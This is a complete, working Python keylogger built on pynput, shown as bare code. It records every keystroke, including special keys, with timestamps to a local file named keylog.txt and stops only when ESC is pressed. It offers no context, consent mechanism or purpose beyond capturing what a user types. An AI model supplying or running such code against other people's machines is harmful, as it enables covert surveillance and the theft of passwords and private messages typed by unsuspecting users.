from pynput import keyboard
from datetime import datetime

log_file = "keylog.txt"

def on_press(key):
    try:
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key.char}\n")
    except AttributeError:
        # Special keys (e.g., shift, ctrl)
        with open(log_file, "a") as f:
            f.write(f"{datetime.now()} - {key}\n")

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener when ESC is pressed
        return False

# Start listening
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
